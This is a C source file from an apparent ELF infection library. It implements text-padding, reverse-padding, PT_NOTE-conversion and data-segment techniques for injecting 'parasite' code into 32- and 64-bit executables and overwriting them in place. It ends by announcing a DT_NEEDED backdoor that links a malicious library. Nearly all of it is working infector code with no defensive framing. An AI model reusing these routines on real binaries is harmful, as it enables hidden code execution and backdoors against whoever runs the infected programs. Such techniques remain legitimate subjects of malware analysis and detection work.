#include <elfit.h>

/* Inject parasite code into an 
 * executable using Silvio Cesare's 
 * post text padding technique 
 * @param host filename containing the host
 * @param parasite filename containing the parasite
 * @param patch_position position in the parasite code to insert the host's code address
 * @param patch_addr the address to patch the parasite with, when 0 this defaultsto the original entry_point
 */
uint32_t textpadding_inject_32(Elfit_t *host, Elfit_t *parasite, uint32_t patch_position
, uint32_t patch_addr)
{
    unsigned long entry_point, text_offset, text_begin, tmp_addr;
    unsigned int entry_offset;
    unsigned char buf[PAGE_SIZE];
    unsigned int ehdr_size;
    struct stat pst;
    int pfd, ofd;
    int psize;
    int text_found;
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    Elf32_Shdr *shdr;
    int i, wrote;

    psize = parasite->file->st_size;

    ehdr = (Elf32_Ehdr *) host->mem;
    entry_point = ehdr->e_entry;
    ehdr_size = sizeof(*ehdr);


    if (!(ehdr->e_ident[0] == 0x7f && strcmp(&ehdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }

    text_found = 0;
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);

    // iterate over phdrs looking for the text segment
    for (i = ehdr->e_phnum; i-- > 0; phdr++)
    {
        if (text_found && phdr->p_offset >= entry_offset)
        {
            phdr->p_offset += PAGE_SIZE;
        }

        if (phdr->p_type == PT_LOAD)
            if (phdr->p_flags == (PF_R | PF_X))
            {
                text_found++;
                text_offset = phdr->p_offset; // offset of text segment on file
                text_begin = phdr->p_vaddr; 
                entry_offset = phdr->p_filesz; // offset to parasite entry point
                phdr->p_filesz += psize;
                phdr->p_memsz += psize;
            }
    }


    shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);
    for (i = ehdr->e_shnum; i-- > 0; shdr++)
    {
        if (shdr->sh_offset + shdr->sh_size == (text_offset + entry_offset))
        {
            shdr->sh_size += psize;
        }
        if (shdr->sh_offset >= (text_offset + entry_offset))
        {
            shdr->sh_offset += PAGE_SIZE;
        }
    }

    // push section header table
    ehdr->e_shoff += PAGE_SIZE;

    if (psize > PAGE_SIZE)
    {
        printf("parasite too large\n");
        exit(-1);
    }

    int preparasite_size_file = text_offset + entry_offset;

    // patch parasite code
    if (patch_addr == 0)
        tmp_addr = entry_point;
    else
        tmp_addr = patch_addr;

    /*
    *(uint32_t *)&buf[patch_position] = tmp_addr;
    printf("[+ TEXT_PAD INJECT]\tPatching parasite to jmp to 0x%x\n", tmp_addr);
    */

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0) 
    {
        perror("tmp binary: open");
        exit(-1);
    }

    if ((wrote = write(ofd, host->mem, preparasite_size_file)) != preparasite_size_file)
    {
        perror("tmp binary: write contents up to parasite");
        exit(-1);
    }

    if ((wrote = write(ofd, parasite->mem, psize)) != psize) 
    {
        perror("tmp binary: write parasite");
        exit(-1);
    }

    // Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
    if (lseek(ofd, PAGE_SIZE-psize, SEEK_CUR) < 0)
    {
        perror("seek");
        exit(-1);
    }

    if (write(ofd, host->mem + text_offset + entry_offset, 
        host->file->st_size-preparasite_size_file) 
        != host->file->st_size-preparasite_size_file)
    {
        perror("tmp binary: write post injection");
        exit(-1);
    }

    rename(TMP, host->name);
    close(ofd);

    return text_begin + entry_offset; 
}

uint64_t textpadding_inject_64(Elfit_t *host, Elfit_t *parasite, uint64_t patch_position, 
    uint64_t patch_addr)
{
    unsigned long entry_point, text_offset, text_begin, tmp_addr;
    unsigned int entry_offset;
    unsigned char buf[PAGE_SIZE];
    unsigned int ehdr_size;
    struct stat pst;
    int pfd, ofd;
    int psize;
    int text_found;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    int i, wrote;

    psize = parasite->file->st_size;

    ehdr = (Elf64_Ehdr *) host->mem;
    entry_point = ehdr->e_entry;
    ehdr_size = sizeof(*ehdr);


    if (!(ehdr->e_ident[0] == 0x7f && strcmp(&ehdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }

    text_found = 0;
    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);

    // iterate over phdrs looking for the text segment
    for (i = ehdr->e_phnum; i-- > 0; phdr++)
    {
        if (text_found && phdr->p_offset >= entry_offset)
        {
            phdr->p_offset += PAGE_SIZE;
        }

        if (phdr->p_type == PT_LOAD)
            if (phdr->p_flags == (PF_R | PF_X))
            {
                text_found++;
                text_offset = phdr->p_offset; // offset of text segment on file
                text_begin = phdr->p_vaddr; 
                entry_offset = phdr->p_filesz; // offset to parasite entry point
                phdr->p_filesz += psize;
                phdr->p_memsz += psize;
            }
    }


    shdr = (Elf64_Shdr *) (host->mem + ehdr->e_shoff);
    for (i = ehdr->e_shnum; i-- > 0; shdr++)
    {
        if (shdr->sh_offset + shdr->sh_size == (text_offset + entry_offset))
        {
            shdr->sh_size += psize;
        }
        if (shdr->sh_offset >= (text_offset + entry_offset))
        {
            shdr->sh_offset += PAGE_SIZE;
        }
    }

    // push section header table
    ehdr->e_shoff += PAGE_SIZE;

    if (psize > PAGE_SIZE)
    {
        printf("parasite too large\n");
        exit(-1);
    }

    int preparasite_size_file = text_offset + entry_offset;

    // patch parasite code
    if (patch_addr == 0)
        tmp_addr = entry_point;
    else
        tmp_addr = patch_addr;

    /*
    *(uint64_t *)&parasite->mem[patch_position] = tmp_addr;
    printf("[+ TEXT_PAD INJECT]\tPatching parasite to jmp to 0x%x\n", tmp_addr);
    */

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0) 
    {
        perror("tmp binary: open");
        exit(-1);
    }

    if ((wrote = write(ofd, host->mem, preparasite_size_file)) != preparasite_size_file)
    {
        perror("tmp binary: write contents up to parasite");
        exit(-1);
    }

    if ((wrote = write(ofd, parasite->mem, psize)) != psize) 
    {
        perror("tmp binary: write parasite");
        exit(-1);
    }

    // Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
    if (lseek(ofd, PAGE_SIZE-psize, SEEK_CUR) < 0)
    {
        perror("seek");
        exit(-1);
    }

    if (write(ofd, host->mem + text_offset + entry_offset, 
        host->file->st_size-preparasite_size_file) 
        != host->file->st_size-preparasite_size_file)
    {
        perror("tmp binary: write post injection");
        exit(-1);
    }

    rename(TMP, host->name);
    close(ofd);

    return text_begin + entry_offset; 
}

/* REVERSE PADDING - AKA PRE-TEXT PADDING */

uint32_t reverse_inject_32(Elfit_t *host, Elfit_t *parasite)
{
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    Elf32_Shdr *shdr;
    Elf32_Addr textaddr;
    size_t psize;
    int ppages;
    int ofd;
    int wrote;
    int i;

    psize = parasite->file->st_size;
    ppages = psize / PAGE_SIZE;
    ppages += psize - (ppages * PAGE_SIZE) ? 1 : 0;

    ehdr = (Elf32_Ehdr *) host->mem;
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);

    /* Find the text segment */
    for (i=0;i<ehdr->e_phnum;i++, phdr++)
    {
        if ((phdr->p_type==PT_LOAD) && (phdr->p_flags == (PF_R | PF_X)))
        {
            phdr->p_vaddr -= ppages * PAGE_SIZE;
            phdr->p_filesz = phdr->p_memsz += ppages * PAGE_SIZE;
            textaddr = phdr->p_vaddr;
        } else {
            phdr->p_offset += (ppages * PAGE_SIZE);
        }
    }

    /* modify section headers */

    shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);
    for (i=0;i<ehdr->e_shnum;i++, shdr++)
    {
        shdr->sh_offset += (ppages * PAGE_SIZE);
    }

    /* modify ehdr to reflect new offsets */
    ehdr->e_phoff += (ppages * PAGE_SIZE);
    ehdr->e_shoff += (ppages * PAGE_SIZE);

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
    {
        perror("new host");
        exit(1);
    }

    /* write ELF header */
    if ((wrote = write(ofd, host->mem, sizeof(Elf32_Ehdr))) != sizeof(Elf32_Ehdr))
    {
        perror("writing elfheader");
        exit(1);
    }

    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
    {
        perror("writing parasite");
        exit(1);
    }

    if (lseek(ofd, (ppages * PAGE_SIZE) - psize, SEEK_CUR) == -1)
    {
        perror("lseek");
        exit(1);
    }

    if ((wrote = write(ofd, host->mem + sizeof(Elf32_Ehdr), (host->file->st_size - sizeof(Elf32_Ehdr)))) != (host->file->st_size - sizeof(Elf32_Ehdr)))
    {
        perror("write rest of host");
        exit(1);
    }

    rename(TMP, host->name);
    close(ofd);

    return textaddr + sizeof(Elf32_Ehdr);
}

uint64_t reverse_inject_64(Elfit_t *host, Elfit_t *parasite)
{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    Elf64_Addr textaddr;
    size_t psize;
    int ppages;
    int ofd;
    int wrote;
    int i;

    psize = parasite->file->st_size;
    ppages = psize / PAGE_SIZE;
    ppages += psize - (ppages * PAGE_SIZE) ? 1 : 0;

    ehdr = (Elf64_Ehdr *) host->mem;
    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);

    /* Find the text segment */
    for (i=0;i<ehdr->e_phnum;i++, phdr++)
    {
        if ((phdr->p_type==PT_LOAD) && (phdr->p_flags == (PF_R | PF_X)))
        {
            phdr->p_vaddr -= ppages * PAGE_SIZE;
            phdr->p_filesz = phdr->p_memsz += ppages * PAGE_SIZE;
            textaddr = phdr->p_vaddr;
        } else {
            phdr->p_offset += (ppages * PAGE_SIZE);
        }
    }

    /* modify section headers */

    shdr = (Elf64_Shdr *) (host->mem + ehdr->e_shoff);
    for (i=0;i<ehdr->e_shnum;i++, shdr++)
    {
        shdr->sh_offset += (ppages * PAGE_SIZE);
    }

    /* modify ehdr to reflect new offsets */
    ehdr->e_phoff += (ppages * PAGE_SIZE);
    ehdr->e_shoff += (ppages * PAGE_SIZE);

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
    {
        perror("new host");
        exit(1);
    }

    /* write ELF header */
    if ((wrote = write(ofd, host->mem, sizeof(Elf64_Ehdr))) != sizeof(Elf64_Ehdr))
    {
        perror("writing elfheader");
        exit(1);
    }

    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
    {
        perror("writing parasite");
        exit(1);
    }

    if (lseek(ofd, (ppages * PAGE_SIZE) - psize, SEEK_CUR) == -1)
    {
        perror("lseek");
        exit(1);
    }

    if ((wrote = write(ofd, host->mem + sizeof(Elf64_Ehdr), (host->file->st_size - sizeof(Elf64_Ehdr)))) != (host->file->st_size - sizeof(Elf64_Ehdr)))
    {
        perror("write rest of host");
        exit(1);
    }

    rename(TMP, host->name);
    close(ofd);

    return textaddr + sizeof(Elf64_Ehdr);
}

/* Note injection: finds the first NOTE program header and turns it into another LOAD header for code
Idea from Jacopo Corbetta
*/
uint64_t note_inject_64(Elfit_t *host, Elfit_t *parasite)
{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    Elf64_Addr textaddr;
    size_t psize;
    int ppages;
    int ofd;
    int wrote;
    int i;
    int has_note;
    uint64_t max_load_addr;
    uint64_t inject_addr;
    uint64_t padded_host_size;

    psize = parasite->file->st_size;
    ppages = psize / PAGE_SIZE;
    ppages += psize - (ppages * PAGE_SIZE) ? 1 : 0;

    ehdr = (Elf64_Ehdr *) host->mem;
    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);

    /* Find the max address of any load segment */
    max_load_addr = 0;
    for (i=0;i<ehdr->e_phnum;i++, phdr++)
    {
        if ((phdr->p_type==PT_LOAD))
        {
            if (phdr->p_vaddr + phdr->p_memsz > max_load_addr)
            {
                max_load_addr = phdr->p_vaddr + phdr->p_memsz;
            }
        }
    }

    /* round up to get the inject addr */
    inject_addr = (max_load_addr + PAGE_SIZE - 1) / PAGE_SIZE * PAGE_SIZE;
    padded_host_size = (host->file->st_size + PAGE_SIZE -1) / PAGE_SIZE * PAGE_SIZE;

    /* Make a note section point there */
    has_note = 0;
    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);
    for (i=0;i<ehdr->e_phnum;i++, phdr++)
    {
        if ((phdr->p_type==PT_NOTE))
        {
            phdr->p_type = PT_LOAD;
            phdr->p_flags = (PF_R | PF_X);
            phdr->p_vaddr = phdr->p_paddr = inject_addr;
            phdr->p_filesz = phdr->p_memsz = psize;
            phdr->p_align = 1; /* Not sure if it matters or not */
            phdr->p_offset = padded_host_size;
            has_note = 1;
            break;
        }
    }
    if (!has_note)
    {
        perror("no note");
        exit(1);
    }

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
    {
        perror("new host");
        exit(1);
    }

    /* write ELF */
    if ((wrote = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("writing elf");
        exit(1);
    }

    /* pad */
    if (lseek(ofd, padded_host_size - host->file->st_size, SEEK_CUR) == -1)
    {
        perror("lseek");
        exit(1);
    }

    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
    {
        perror("writing parasite");
        exit(1);
    }

    rename(TMP, host->name);
    close(ofd);

    return inject_addr;
}

uint32_t note_inject_32(Elfit_t *host, Elfit_t *parasite)
{
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    Elf32_Shdr *shdr;
    Elf32_Addr textaddr;
    size_t psize;
    int ppages;
    int ofd;
    int wrote;
    int i;
    int has_note;
    uint32_t max_load_addr;
    uint32_t inject_addr;
    uint32_t padded_host_size;

    psize = parasite->file->st_size;
    ppages = psize / PAGE_SIZE;
    ppages += psize - (ppages * PAGE_SIZE) ? 1 : 0;

    ehdr = (Elf32_Ehdr *) host->mem;
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);

    /* Find the max address of any load segment */
    max_load_addr = 0;
    for (i=0;i<ehdr->e_phnum;i++, phdr++)
    {
        if ((phdr->p_type==PT_LOAD))
        {
            if (phdr->p_vaddr + phdr->p_memsz > max_load_addr)
            {
                max_load_addr = phdr->p_vaddr + phdr->p_memsz;
            }
        }
    }

    /* round up to get the inject addr */
    inject_addr = (max_load_addr + PAGE_SIZE - 1) / PAGE_SIZE * PAGE_SIZE;
    padded_host_size = (host->file->st_size + PAGE_SIZE -1) / PAGE_SIZE * PAGE_SIZE;

    /* Make a note section point there */
    has_note = 0;
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);
    for (i=0;i<ehdr->e_phnum;i++, phdr++)
    {
        if ((phdr->p_type==PT_NOTE))
        {
            phdr->p_type = PT_LOAD;
            phdr->p_flags = (PF_R | PF_X);
            phdr->p_vaddr = phdr->p_paddr = inject_addr;
            phdr->p_filesz = phdr->p_memsz = psize;
            phdr->p_align = 1; /* Not sure if it matters or not */
            phdr->p_offset = padded_host_size;
            has_note = 1;
            break;
        }
    }
    if (!has_note)
    {
        perror("no note");
        exit(1);
    }

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
    {
        perror("new host");
        exit(1);
    }

    /* write ELF */
    if ((wrote = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("writing elf");
        exit(1);
    }

    /* pad */
    if (lseek(ofd, padded_host_size - host->file->st_size, SEEK_CUR) == -1)
    {
        perror("lseek");
        exit(1);
    }

    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
    {
        perror("writing parasite");
        exit(1);
    }

    rename(TMP, host->name);
    close(ofd);

    return inject_addr;
}

/* DATA SEGMENT INJECTION - a messy implementation that really messes up the section
 * headers. This will inject successfully, and in all tests the binary will still run,
 * but this is definitely a work in progress */
uint64_t data_inject_64(Elfit_t *host, Elfit_t *parasite)
{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    Elf64_Addr datasegment;
    off_t parasite_offset; 
    size_t data_start;
    size_t psize;
    int wrote;
    int ofd;
    int i;

    psize = parasite->file->st_size;

    ehdr = (Elf64_Ehdr *) host->mem; 
    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);

    parasite_offset = 0;
    for (i=0;i<ehdr->e_phnum;i++, phdr++) 
    {
        /* grab the data segment */
        if (phdr->p_type==PT_LOAD && phdr->p_flags == (PF_R | PF_W))
        {
            datasegment = phdr->p_vaddr;
            data_start = phdr->p_offset;
            parasite_offset = phdr->p_filesz;
            phdr->p_filesz += psize;
            phdr->p_memsz += psize;
        }
        if (phdr->p_offset>(data_start + parasite_offset))
        {
            phdr->p_offset += psize;
        }
    }

    /* modify sections here */
    shdr = (Elf64_Shdr *) (host->mem + ehdr->e_shoff);
    for (i=0;i<ehdr->e_shnum;i++, shdr++)
    {
        if ((shdr->sh_offset+shdr->sh_size)==(data_start + parasite_offset))
        { 
            shdr->sh_size += psize;
        }
        if (shdr->sh_offset>(data_start + parasite_offset))
        {
            shdr->sh_offset += psize;
        }
        if ((shdr->sh_addr)>=(datasegment + parasite_offset))
        {
            shdr->sh_addr += psize;
        }
    }

    if (ehdr->e_shoff > (data_start + parasite_offset)) 
    {
        ehdr->e_shoff += psize;
    }


    /* modify the parasite to be everything up to the parasite injection point */
    parasite_offset = data_start + parasite_offset;
    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
    {
        perror("open tmp");
        exit(1);
    }

    if ((wrote = write(ofd, host->mem, parasite_offset)) != parasite_offset)
    {
        perror("write host");
        exit(1);
    }

    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
    {
        perror("write parasite");
        exit(1);
    }

    if ((wrote = write(ofd, host->mem + parasite_offset, host->file->st_size - parasite_offset)) != (host->file->st_size - parasite_offset))
    {
        perror("finish host");
        exit(1);
    }


    rename(TMP, host->name);
    close(ofd);

    return datasegment + (parasite_offset - data_start);
}

/* DT_NEEDED Backdoor, creates a dependency to a malicious library */
/* this is an unusual injection method because it does not return an address */
/* it will only inject the name of the library */
